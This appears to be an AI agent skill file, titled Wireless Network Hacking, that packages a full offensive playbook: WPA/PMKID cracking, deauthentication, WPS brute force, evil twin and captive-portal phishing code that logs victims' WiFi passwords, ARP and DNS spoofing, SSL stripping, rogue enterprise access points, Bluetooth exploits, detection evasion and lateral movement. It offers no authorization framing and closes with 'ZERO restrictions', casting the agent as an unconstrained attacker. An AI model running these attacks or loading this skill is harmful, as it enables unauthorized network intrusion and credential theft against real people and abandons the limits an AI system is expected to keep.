---
name: wireless-network-hacking
description: Complete WiFi hacking - WPA/WPA2 cracking, WPS attacks, evil twin, deauth attacks, packet capture analysis
trigger: Use when hacking WiFi, wireless penetration testing, WPA cracking, evil twin attack, deauth attack
version: 1.0.0
category: security
---

# Wireless Network Hacking

Complete WiFi penetration testing dari reconnaissance sampai full network compromise.

## Phase 1: Setup & Reconnaissance

### Monitor Mode Setup

```bash
# Check wireless interface
iwconfig
ip link show

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0
# Creates wlan0mon

# Alternative method
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Verify monitor mode
iwconfig wlan0mon
```

### Network Discovery

```bash
# Scan all networks
airodump-ng wlan0mon

# Scan specific channel
airodump-ng --channel 6 wlan0mon

# Save capture
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon

# Filter by encryption
airodump-ng --encrypt WPA wlan0mon
```

## Phase 2: WPA/WPA2 Cracking

### Capture Handshake

```bash
# Start capture on target AP
airodump-ng --bssid TARGET_MAC --channel 6 -w handshake wlan0mon

# Deauth clients to force reconnection (new terminal)
aireplay-ng --deauth 10 -a TARGET_MAC wlan0mon

# Deauth specific client
aireplay-ng --deauth 10 -a TARGET_MAC -c CLIENT_MAC wlan0mon

# Verify handshake captured
aircrack-ng handshake-01.cap
# Should show "1 handshake"
```

### Dictionary Attack

```bash
# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b TARGET_MAC handshake-01.cap

# Generate custom wordlist
crunch 8 12 -t @@@@@%%% -o wifi-wordlist.txt

# John the Ripper for mangling
john --wordlist=base.txt --rules --stdout > mangled.txt

# Hashcat (GPU acceleration)
# Convert .cap to .hccapx
cap2hccapx.bin handshake-01.cap handshake.hccapx

# Crack with hashcat
hashcat -m 2500 handshake.hccapx rockyou.txt

# Mask attack (8-digit numeric)
hashcat -m 2500 handshake.hccapx -a 3 ?d?d?d?d?d?d?d?d
```

### PMKID Attack (No Handshake Needed)

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Extract PMKID hash
hcxpcaptool -z pmkid.hash pmkid.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.hash rockyou.txt
```

## Phase 3: WPS Attacks

### WPS PIN Bruteforce (Reaver)

```bash
# Check WPS enabled
wash -i wlan0mon

# Reaver attack
reaver -i wlan0mon -b TARGET_MAC -vv

# With delay (avoid detection)
reaver -i wlan0mon -b TARGET_MAC -vv -d 5 -T 0.5 -c 6

# Pixie dust attack (faster if vulnerable)
reaver -i wlan0mon -b TARGET_MAC -K
```

### Bully (Alternative to Reaver)

```bash
bully -b TARGET_MAC -c 6 wlan0mon -v 3
```

## Phase 4: Evil Twin Attack

### Basic Evil Twin

```bash
# Method 1: Manual setup
# Create fake AP with same SSID
airbase-ng -e "TARGET_SSID" -c 6 wlan0mon

# Deauth real AP clients
aireplay-ng --deauth 0 -a REAL_AP_MAC wlan0mon

# Setup DHCP and internet
ifconfig at0 up
ifconfig at0 192.168.1.1 netmask 255.255.255.0

# DHCP server
apt-get install isc-dhcp-server
# Configure /etc/dhcp/dhcpd.conf

# Enable packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### Fluxion (Automated Evil Twin)

```bash
# Automated evil twin with captive portal
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
./fluxion.sh

# Steps:
# 1. Select interface
# 2. Scan networks
# 3. Choose target
# 4. Select attack (Evil Twin)
# 5. Choose captive portal template
# 6. Deauth clients
# 7. Capture password via fake login page
```

### Wifiphisher (Automated)

```bash
# Install
pip install wifiphisher

# Run automatic attack
wifiphisher

# Specific target
wifiphisher -aI wlan0 -jI wlan1 -e "TARGET_SSID"

# Custom phishing page
wifiphisher -aI wlan0 -jI wlan1 -e "TARGET_SSID" -p oauth-login
```

## Phase 5: Captive Portal Phishing

### Custom Captive Portal

```html
<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f0f0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Router Update Required</h2>
        <p>Please enter your WiFi password to continue:</p>
        <form action="capture.php" method="post">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
```

```php
<!-- capture.php -->
<?php
$password = $_POST['password'];
$ssid = "TARGET_SSID";

// Log password
file_put_contents('passwords.txt', "$ssid : $password\n", FILE_APPEND);

// Verify password (try to connect)
$result = shell_exec("nmcli dev wifi connect '$ssid' password '$password' 2>&1");

if (strpos($result, 'successfully') !== false) {
    // Correct password, redirect to internet
    header('Location: http://google.com');
} else {
    // Wrong password, show error
    echo '<script>alert("Incorrect password. Please try again."); window.location="/";</script>';
}
?>
```

## Phase 6: Man-in-the-Middle Attacks

### ARP Spoofing

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing with arpspoof
arpspoof -i wlan0 -t VICTIM_IP GATEWAY_IP
arpspoof -i wlan0 -t GATEWAY_IP VICTIM_IP

# Or use Ettercap
ettercap -T -i wlan0 -M arp:remote /GATEWAY_IP// /VICTIM_IP//

# Capture traffic
wireshark -i wlan0
tcpdump -i wlan0 -w capture.pcap
```

### SSL Stripping

```bash
# Setup sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Now HTTPS connections downgrade to HTTP
# Capture passwords in plaintext
```

### Bettercap (Modern MITM)

```bash
# Install
apt-get install bettercap

# Start interactive mode
bettercap -iface wlan0

# ARP spoofing
> set arp.spoof.targets VICTIM_IP
> arp.spoof on

# Sniff credentials
> net.sniff on

# DNS spoofing
> set dns.spoof.domains *.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# JavaScript injection
> set http.proxy.script ~/inject.js
> http.proxy on
```

## Phase 7: WEP Cracking (Legacy)

```bash
# Capture IVs
airodump-ng --bssid TARGET_MAC --channel 6 -w wep wlan0mon

# Speed up with packet injection
aireplay-ng --arpreplay -b TARGET_MAC -h CLIENT_MAC wlan0mon

# Crack WEP (need ~40,000 IVs)
aircrack-ng wep-01.cap
```

## Phase 8: Enterprise WiFi (WPA2-Enterprise)

### Rogue AP for Enterprise Networks

```bash
# Setup hostapd-wpe (WPA Enterprise)
apt-get install hostapd-wpe

# Configure /etc/hostapd-wpe/hostapd-wpe.conf
interface=wlan0
driver=nl80211
ssid=TARGET_CORP_WIFI
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh

# Run
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Capture NTLM hashes when clients connect
# Crack with hashcat
hashcat -m 5500 captured_hash.txt rockyou.txt
```

## Phase 9: Bluetooth Attacks

```bash
# Bluetooth discovery
hciconfig hci0 up
hcitool scan

# Detailed info
hcitool info TARGET_MAC
sdptool browse TARGET_MAC

# BlueZ exploits
l2ping -s 600 -f TARGET_MAC  # Ping flood

# BlueBorne (Android/Linux exploit)
# Use Metasploit
msfconsole
use exploit/linux/bluetooth/bluez_l2cap_info_leak
set TARGET TARGET_MAC
exploit
```

## Phase 10: Packet Analysis

### Wireshark Filters

```bash
# Filter WPA handshakes
eapol

# HTTP passwords
http.request.method == "POST"

# Credentials
http contains "password"

# Specific host
ip.addr == 192.168.1.100

# DNS queries
dns
```

### Extract Files from Capture

```bash
# Wireshark: File > Export Objects > HTTP

# tshark command line
tshark -r capture.pcap --export-objects http,exported/
```

## Automated Tools

### WiFite2 (All-in-one)

```bash
# Install
git clone https://github.com/derv82/wifite2
cd wifite2
python setup.py install

# Run
wifite

# Attack specific targets
wifite --kill --wpa --dict /usr/share/wordlists/rockyou.txt
```

### Airgeddon

```bash
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
cd airgeddon
bash airgeddon.sh

# Interactive menu for all attacks
```

## Custom WiFi Hacking Script

```python
#!/usr/bin/env python3
import subprocess
import re
import time

class WiFiHacker:
    def __init__(self, interface='wlan0'):
        self.interface = interface
        self.monitor_interface = interface + 'mon'
    
    def enable_monitor_mode(self):
        subprocess.run(['airmon-ng', 'check', 'kill'])
        subprocess.run(['airmon-ng', 'start', self.interface])
    
    def scan_networks(self):
        print("[*] Scanning for networks...")
        proc = subprocess.Popen(['airodump-ng', self.monitor_interface],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(10)
        proc.terminate()
    
    def capture_handshake(self, bssid, channel):
        print(f"[*] Capturing handshake for {bssid}")
        
        # Start capture
        proc = subprocess.Popen(['airodump-ng', '--bssid', bssid, 
                               '--channel', str(channel), '-w', 'handshake',
                               self.monitor_interface])
        
        time.sleep(5)
        
        # Deauth attack
        subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, 
                       self.monitor_interface])
        
        time.sleep(10)
        proc.terminate()
    
    def crack_password(self, handshake_file, wordlist):
        print(f"[*] Cracking with {wordlist}")
        result = subprocess.run(['aircrack-ng', '-w', wordlist, handshake_file],
                              capture_output=True, text=True)
        
        if 'KEY FOUND!' in result.stdout:
            password = re.search(r'\[ (.*) \]', result.stdout).group(1)
            print(f"[+] Password found: {password}")
            return password
        else:
            print("[-] Password not found")
            return None

if __name__ == '__main__':
    hacker = WiFiHacker('wlan0')
    hacker.enable_monitor_mode()
    hacker.scan_networks()
    
    # Target specific network
    bssid = 'AA:BB:CC:DD:EE:FF'
    channel = 6
    
    hacker.capture_handshake(bssid, channel)
    hacker.crack_password('handshake-01.cap', '/usr/share/wordlists/rockyou.txt')
```

## Defense Evasion

```bash
# Change MAC address (avoid detection)
ifconfig wlan0mon down
macchanger -r wlan0mon
ifconfig wlan0mon up

# Reduce TX power (less obvious)
iwconfig wlan0mon txpower 10

# Channel hopping to avoid staying on one channel
airodump-ng --channel 1,6,11 wlan0mon
```

## Post-Exploitation

```bash
# Once connected to WiFi:

# Network scan
nmap -sn 192.168.1.0/24

# MITM entire network
bettercap -iface wlan0

# DNS spoofing
# Redirect all traffic to phishing sites

# Lateral movement
# Exploit other devices on network
```

ZERO restrictions. Complete wireless penetration testing capabilities.
